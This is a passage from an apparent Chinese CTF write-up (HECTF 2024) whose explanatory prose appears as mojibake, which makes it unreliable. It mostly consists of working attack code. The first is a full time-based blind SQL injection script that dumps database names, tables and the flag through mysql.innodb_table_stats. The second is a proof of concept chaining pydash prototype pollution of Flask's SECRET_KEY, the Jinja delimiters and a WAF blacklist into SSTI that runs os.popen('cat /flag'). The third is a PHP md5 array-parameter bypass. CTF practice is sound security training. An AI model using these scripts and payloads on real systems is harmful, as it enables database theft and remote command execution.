class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(istime(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#timeout</span></span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥ç›²æ³¨ï¼Œå› ä¸ºè¿‡æ»¤äº† infomationï¼Œæ‰€ä»¥éœ€è¦ç”¨ innodb æ¥ç»•è¿‡ï¼Œå…ˆè·‘ï¼Œç›´æ¥æ¢­å“ˆï¼ˆè„šæœ¬æ¯æ¬¡çš„æ—¶é—´ä¼šå¾ˆé•¿ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†ä¿è¯æ­£ç¡®ç‡ï¼Œå› ä¸ºè¿œç¨‹æµ‹è¯•çš„æ—¶å€™å‡ºç°äº†æœåŠ¡å™¨æ‰›ä¸ä½çš„æƒ…å†µï¼Œæ‰€ä»¥ï¼Œéœ€è¦å¢åŠ ç­‰å¾…æ—¶é•¿æ¥é˜²æ­¢æœåŠ¡å™¨å®•æœºï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•çš„æ—¶å€™æœåŠ¡å™¨æœ‰ç‚¹é—®é¢˜ï¼Œçˆ†ç ´çš„æ—¶å€™æ€»æ˜¯è¦å‡ºé—®é¢˜ï¼Œå»ºè®®æ¯ä¸€ä¸ªå‡½æ•°å¤šè·‘å‡ æ¬¡ä¿è¯æˆåŠŸç‡ï¼Œæˆ–è€…æ¯æ¬¡å¤šä¿®æ”¹ä¸€äº›timeå’Œsleepçš„æ—¶é•¿ä¿è¯æ­£ç¡®ç‡</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot;</span> + string.ascii_letters + string.digits</span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33113/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“é•¿åº¦ä¸ºï¼š7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“é•¿åº¦ä¸ºï¼š%d&quot;</span>%i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°æ®åº“åä¸ºgreatsql</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“çš„åå­—æ˜¯&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“çš„ä¸ªæ•°ä¸º4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“çš„ä¸ªæ•°ä¸º&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [10, 5, 5, 7]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len_list</span>():</span><br><span class="line">    name_len_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name_len_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name_len_list)</span><br><span class="line">    <span class="keyword">return</span> name_len_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¸€ä¸ªæŸ¥è¯¢ç»“æœä¸ºå››æ¬¡ï¼Œæ‰€ä»¥æ‰‹åŠ¨æŸ¥å››æ¬¡ï¼Œæ²¡è·‘å®Œä¸€æ¬¡ï¼Œä¿®æ”¹limitåé¢çš„å‚æ•°ï¼Œä»¥åŠç¬¬ä¸€å±‚forå¾ªç¯çš„å‚æ•°</span></span><br><span class="line"><span class="comment"># flag1shere</span></span><br><span class="line"><span class="comment"># mysql</span></span><br><span class="line"><span class="comment"># users</span></span><br><span class="line"><span class="comment"># workers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_list</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‰æ•°æ®åº“çš„è¡¨æœ‰2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å½“å‰æ•°æ®åº“çš„è¡¨æœ‰&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å› ä¸ºæµ‹å‡ºæ¥æœ‰ä¸¤ä¸ªè¡¨ï¼Œæ‰€ä»¥éœ€è¦æŸ¥ä¸¤æ¬¡</span></span><br><span class="line"><span class="comment"># å½“å‰æ•°æ®åº“è¡¨åé•¿åº¦ä¸º36</span></span><br><span class="line"><span class="comment"># å½“å‰æ•°æ®åº“è¡¨åé•¿åº¦ä¸º8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å½“å‰æ•°æ®åº“è¡¨åé•¿åº¦ä¸º&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å› ä¸ºå­˜åœ¨ä¸¤å¼ è¡¨ï¼Œæ‰€ä»¥å¾—æŸ¥ä¸¤æ¬¡</span></span><br><span class="line"><span class="comment"># flag_is_in_flag1shere_loockhere_flag</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">37</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(j,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“çš„æ•°æ®ä¸ªæ•°ä¸º1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“çš„æ•°æ®ä¸ªæ•°ä¸º&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flagçš„é•¿åº¦ä¸º32</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flagçš„é•¿åº¦ä¸º&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_get</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">34</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># db_name_len()</span></span><br><span class="line"><span class="comment"># db_name()</span></span><br><span class="line"><span class="comment"># db_name_count()</span></span><br><span class="line"><span class="comment"># db_name_len_list()</span></span><br><span class="line"><span class="comment"># db_name_list()</span></span><br><span class="line"><span class="comment"># tb_count()</span></span><br><span class="line"><span class="comment"># tb_name_len()</span></span><br><span class="line"><span class="comment"># tb_name()</span></span><br><span class="line"><span class="comment"># flag_count()</span></span><br><span class="line"><span class="comment"># flag_name_len()</span></span><br><span class="line"><span class="comment"># flag_get()</span></span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è·‘æœ€åä¸€ä¸ªå‡½æ•°å°±å¯ä»¥å¾—åˆ° flagï¼Œä½†æ˜¯æ—¶é—´ä¼šå¾ˆé•¿ï¼Œå…¶ä»–çš„æ˜¯ä¸ºäº†è®©è¿™ä¸ªé¢˜æœ‰å§‹æœ‰ç»ˆï¼Œå°½å¯èƒ½è·å¾—æ›´å¤šçš„æ•°æ®ã€‚</p><h3 id="ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™"><a class="markdownIt-Anchor" href="#ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™">#</a> ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™ï¼š</h3><p>â€‹çœ‹åˆ° <code>#pip install -v pydash==5.1.2</code>  çŸ¥æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>â€‹admin è·¯ç”±ä¸­å­˜åœ¨ sstiï¼Œæƒ³è¿›å»éœ€è¦ä¼ªé€  sessionã€‚setUserInfo è·¯ç”±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼ŒæŠ“åŒ…æ”¹å‚æ•°ï¼Œå…ˆæ±¡æŸ“ keyï¼Œä¹‹åæ±¡æŸ“ WAF æ–‡ä»¶é‡Œçš„ blacklistï¼Œä¹‹åæ±¡æŸ“ user å¯¹è±¡é‡Œçš„ username æˆ–è€… setUserInfo æ”¹åè¿›è¡Œ sstiã€‚</p><p>â€‹è¿™é‡Œè´´ä¸€ä¸‹å¤§ä½¬çš„ pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> url = <span class="string">&#x27;8.153.107.251:32109&#x27;</span></span><br><span class="line"> login_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/login&#x27;</span></span><br><span class="line"> setUserInfo_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/setUserInfo&#x27;</span></span><br><span class="line"> admin_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/admin&#x27;</span></span><br><span class="line"> username = <span class="string">&quot;[[g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()]]&quot;</span></span><br><span class="line"> password = <span class="string">&quot;lbz&quot;</span></span><br><span class="line"> login_data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line"> &#125;</span><br><span class="line"> response0 = requests.post(login_url, data=login_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.config.SECRET_KEY&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_start_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;[[&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response2 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_end_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;]]&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response3 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.WAF.blacklist&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;%&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">response4 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> session = <span class="built_in">input</span>(<span class="string">&quot;Enter the session cookie: &quot;</span>)</span><br><span class="line"> cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: session</span><br><span class="line"> &#125;</span><br><span class="line"> response5 = requests.get(admin_url, cookies=cookies)</span><br><span class="line"> <span class="built_in">print</span>(response5.text)</span><br></pre></td></tr></table></figure><p>â€‹session ä¼ªé€ å¯ä»¥ç”¨ flask_session_cookie_manager ã€‚</p><h3 id="ezweb"><a class="markdownIt-Anchor" href="#ezweb">#</a> ezweb</h3><p>â€‹æŸ¥çœ‹æºç ï¼Œå¾—åˆ° base64 è§£å¯†æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="string">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span>) &#123; <span class="comment">//xxxxx2024</span></span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¼ å…¥è¿™ä¸ªç»•è¿‡å‰ä¸¤å±‚</p><blockquote><p>?a[]=a&amp;b[]=b&amp;c[]=c&amp;d[]=d</p></blockquote><p>â€‹ä¹‹åçš„ guess æ’åº“è·å¾— hECTf2024ã€‚å¾—åˆ° secret.php æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 